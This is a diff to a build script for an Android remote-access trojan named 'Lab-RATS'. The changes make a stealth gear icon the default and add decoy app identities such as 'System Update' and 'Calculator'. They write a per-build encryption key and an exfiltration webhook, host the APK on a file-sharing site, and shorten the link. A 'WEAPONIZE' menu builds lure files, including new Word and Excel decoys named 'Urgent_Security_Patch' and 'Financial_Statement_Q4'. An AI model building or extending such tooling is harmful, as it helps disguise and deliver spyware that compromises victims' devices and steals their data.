@@ -24,8 +24,8 @@ PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
 CONFIG_FILE="$SCRIPT_DIR/build_config.txt"
 
 # Default logos
-DEFAULT_LOGO="$PROJECT_DIR/app/src/main/res/drawable/app_logo.png"
-COVERT_LOGO="$SCRIPT_DIR/covert_launcher.png"
+DEFAULT_LOGO="$PROJECT_DIR/assets/app_logo.png"
+COVERT_LOGO="$PROJECT_DIR/assets/default_app_icon.png"
 
 # Banner
 print_banner() {
@@ -100,19 +100,26 @@ EOF
 # Configure logo
 configure_logo() {
     echo -e "${CYAN}[*] Logo Configuration${NC}"
-    echo "    1. Use Stealth logo (grey gear)"
+    echo "    1. Use Recommended Stealth logo (grey gear)"
     echo "    2. Use default Lab-RATS logo"
     echo "    3. Use custom logo (path)"
     echo "    4. Skip"
-    read -p "    Choice (Default 2): " LOGO_OPTION
-    LOGO_OPTION=${LOGO_OPTION:-2}
+    read -p "    Choice (Default 1): " LOGO_OPTION
+    LOGO_OPTION=${LOGO_OPTION:-1}
 
     case $LOGO_OPTION in
-        1) cp "$COVERT_LOGO" "$PROJECT_DIR/app/src/main/res/drawable/app_logo.png" 2>/dev/null ;;
-        2) # If a backup exists, restore it, otherwise assume current is default
-           [ -f "$PROJECT_DIR/app/src/main/res/drawable/app_logo.png.bak" ] && cp "$PROJECT_DIR/app/src/main/res/drawable/app_logo.png.bak" "$PROJECT_DIR/app/src/main/res/drawable/app_logo.png"
+        1)
+           if command -v magick &> /dev/null; then
+               # Zoomed in 25% (Crop Zoom Effect)
+               magick convert "$COVERT_LOGO" -resize 125% -gravity center -extent 512x512 "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png"
+           elif command -v convert &> /dev/null; then
+               convert "$COVERT_LOGO" -resize 125% -gravity center -extent 512x512 "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png"
+           else
+               cp "$COVERT_LOGO" "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png" 2>/dev/null
+           fi
            ;;
-        3) read -p "    Enter path: " P; [ -f "$P" ] && cp "$P" "$PROJECT_DIR/app/src/main/res/drawable/app_logo.png" ;;
+        2) cp "$DEFAULT_LOGO" "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png" 2>/dev/null ;;
+        3) read -p "    Enter path: " P; [ -f "$P" ] && cp "$P" "$PROJECT_DIR/app/src/main/res/drawable/default_app_icon.png" ;;
     esac
     echo -e "${GREEN}[✓] Logo applied${NC}"
 }
@@ -134,6 +141,12 @@ configure_app() {
     read -p "    Enter Min SDK [26]: " MIN_SDK
     MIN_SDK=${MIN_SDK:-26}
 
+    echo -e "${CYAN}[*] Decoy Identity Selection${NC}"
+    echo "    1. System Update (Gear)  2. Calculator"
+    echo "    3. Weather               4. Settings"
+    read -p "    Choice (Default 1): " DECOY_CHOICE
+    DECOY_CHOICE=${DECOY_CHOICE:-1}
+
     BUILD_GRADLE="$PROJECT_DIR/app/build.gradle"
     sed -i '' "s|applicationId \"[^\"]*\"|applicationId \"$PKG_NAME\"|g" "$BUILD_GRADLE"
     sed -i '' "s|versionName \".*\"|versionName \"$VERSION_NAME\"|g" "$BUILD_GRADLE"
@@ -144,6 +157,7 @@ configure_app() {
     echo "APP_NAME=\"$APP_NAME\"" >> "$CONFIG_FILE"
     echo "VERSION_NAME=\"$VERSION_NAME\"" >> "$CONFIG_FILE"
     echo "MIN_SDK=\"$MIN_SDK\"" >> "$CONFIG_FILE"
+    echo "DECOY_CHOICE=\"$DECOY_CHOICE\"" >> "$CONFIG_FILE"
 
     read -p "    Enter Webhook URL (Google Script): " WEB_URL
     if [ -n "$WEB_URL" ]; then
@@ -152,6 +166,21 @@ configure_app() {
     else
         # Ensure it's at least empty if not set, without corrupting
         sed -i '' "s|WEBHOOK_URL=.*|WEBHOOK_URL=|g" "$PROJECT_DIR/local.properties"
+    fi
+
+    # Persist Decoy Choice for build.gradle
+    if grep -q "DECOY_CHOICE=" "$PROJECT_DIR/local.properties"; then
+        sed -i '' "s|DECOY_CHOICE=.*|DECOY_CHOICE=$DECOY_CHOICE|g" "$PROJECT_DIR/local.properties"
+    else
+        echo "DECOY_CHOICE=$DECOY_CHOICE" >> "$PROJECT_DIR/local.properties"
+    fi
+
+    # Generate Dynamic Encryption Key for every build
+    RAND_KEY=$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)
+    if grep -q "ENCRYPTION_KEY=" "$PROJECT_DIR/local.properties"; then
+        sed -i '' "s|ENCRYPTION_KEY=.*|ENCRYPTION_KEY=$RAND_KEY|g" "$PROJECT_DIR/local.properties"
+    else
+        echo "ENCRYPTION_KEY=$RAND_KEY" >> "$PROJECT_DIR/local.properties"
     fi
 }
 
@@ -261,7 +290,7 @@ infection_wizard() {
     local DOWNLOAD_URL=""
     if [ "$H" == "2" ]; then
         read -p "    Target IPv6: " IP
-        DOWNLOAD_URL="http://[$IP]:8080/download/Update.apk"
+        DOWNLOAD_URL="http://[$IP]:9191/download/Update.apk"
     else
         echo -e "${YELLOW}[*] Uploading to Catbox.moe...${NC}"
         # Added -sS and error checking for curl
@@ -272,13 +301,22 @@ infection_wizard() {
             return 1
         fi
         echo -e "${GREEN}[✓] Hosted: $DOWNLOAD_URL${NC}"
+
+        # URL Shortening (New Optimization)
+        echo -e "${YELLOW}[*] Shortening delivery URL...${NC}"
+        SHORT_URL=$(curl -s "https://is.gd/create.php?format=simple&url=$DOWNLOAD_URL")
+        if [[ "$SHORT_URL" == "http"* ]]; then
+            DOWNLOAD_URL=$SHORT_URL
+            echo -e "${GREEN}[✓] Shortened: $DOWNLOAD_URL${NC}"
+        fi
     fi
 
     echo ""
     echo -e "${CYAN}[WEAPONIZE] Select Vector:${NC}"
     echo "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
     echo "    4. Dolby Audio     5. ADB Script    6. Bluetooth/NFC"
-    echo "    7. Stego Image     8. PWA Bundle"
+    echo "    7. Stego Image     8. PWA Bundle    9. Office Word"
+    echo "    10. Office Excel"
     read -p "    Choice: " V
     case $V in
         1) generate_exploit_standalone "mp4" "$DOWNLOAD_URL" ;;
@@ -289,6 +327,8 @@ infection_wizard() {
         6) generate_exploit_standalone "vcf" "$DOWNLOAD_URL" "System Update" ;;
         7) generate_exploit_standalone "stego" "$DOWNLOAD_URL" ;;
         8) generate_exploit_standalone "pwa" "$DOWNLOAD_URL" "System Update" ;;
+        9) generate_exploit_standalone "docx" "$DOWNLOAD_URL" "Urgent_Security_Patch" ;;
+        10) generate_exploit_standalone "xlsx" "$DOWNLOAD_URL" "Financial_Statement_Q4" ;;
         *) echo -e "${RED}[!] Invalid Choice${NC}" ;;
     esac
 
